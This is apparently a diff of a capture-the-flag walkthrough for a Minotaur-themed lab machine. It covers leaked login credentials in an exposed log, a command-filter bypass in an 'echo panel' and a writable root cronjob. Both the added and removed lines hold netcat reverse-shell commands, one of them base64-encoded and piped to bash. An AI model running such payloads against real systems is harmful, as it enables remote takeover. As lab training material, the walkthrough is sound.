@@ -29,28 +29,10 @@ Not to forget, he forgets a lot of stuff, that's why he likes to keep things on 
 -- Minotaur
 
 lets focus on the web server now:
-you get a login pannel if you look at the login.js you see this INTERESTING function
-function pwdgen() {
-    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
-    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
-    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
-}
-//pwd gen for Daedalus a[9]b[10]b[5]c[9]c[9]c[1]a[2]a[5]c[0]c[9]b[8]
-//                             |\____/|
-///                           (\|----|/)
-//                             \ 0  0 /
-//                              |    |
-//                           ___/\../\____
-//                          /     --       \
-
-lets write a quick python script to solve this :
-a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
-b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
-c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
-
-print(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
-you get g2e55kh4ck5r as password
-login as user: Daedalus and password: g2e55kh4ck5r
+doing a quick dir-scan shows that the /logs dir is exposed to the public
+you can find a post request log at http://[Machine_IP]/logs/post/post_log.log
+where you can find a valid password and user name to login with
+email=Daedalus&password=g2e55kh4ck5r
 
 you get presented with an api interface where you can query for user data:
 lets try quering for our user Daedalus
@@ -68,10 +50,14 @@ if you look at inspect element theres a hint hidden it tells you something about
  user: M!n0taur password: aminotauro
  and a link to an pannel called "secret echo pannel"
 there you can echo some your input out witch internally executes the echo command but you somhow have to bypass the filters and gain RCE
-when you find out `` is permitted and you execute commands with it (you have to execute them seperatly at ';' because this char is filterd)
+when you find out `` is permitted and you execute commands with it (you have to execute them seperatly at ';' because this char is filterd )
+the best way to bypass the filter is just with a base64 encoded reverse shell payload
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4243 >/tmp/f 
+to this
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y=
 
-rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
-
+since the equals sign is also filterd you will have to remove it witch leaves you with this payload
+eco "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash
 then you get access to to machine and find the user flag located in /home/user/
 
 you see theres cronjob running on a file owend by root(location: /timer/timer.sh) but wrteable by everyone
